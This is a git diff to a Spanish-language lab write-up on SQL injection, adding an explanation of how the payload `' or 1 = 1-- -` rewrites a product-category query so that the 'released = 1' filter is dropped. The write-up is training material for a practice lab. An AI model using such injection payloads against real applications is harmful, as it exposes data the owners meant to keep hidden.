@@ -16,11 +16,24 @@ To solve the lab, perform a SQL injection attack that causes the application to 
 
 ### Explicación:
 
-### Query original:
+- Esta en la query original:
+
+````sql
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+````
+
+- Y al final se termina "rompiendo" así _(quitando esas condicionales muahaha!)_:
+
+````sql
+SELECT * FROM products WHERE category = 'Gifts' or 1 = 1-- -' AND released = 1 (soy la noche :P)
+````
 
 El payload se inyecta en donde se pone el nombre del artículo o sección:
 
 ![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/0b35f1ca-3c73-4837-a0f8-b5be87e084bf)
+
+
+---
 
 ### Ejemplo con lab:
 
